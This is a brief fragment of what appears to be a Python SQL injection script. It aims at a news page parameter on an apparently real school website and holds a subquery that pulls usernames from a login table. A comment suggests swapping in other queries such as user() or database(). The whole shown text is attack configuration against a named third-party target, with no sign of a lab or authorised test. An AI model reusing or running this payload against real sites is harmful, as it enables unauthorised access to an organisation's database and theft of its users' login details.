...
BASE_URL = "https://mtspublicschool.ac.in/news.php?id=37"
...
SQL_QUERY = "(select username from login_tb limit 0,1)"  # 👈 You can change this to any dynamic SQL, like `user()` or `database()`
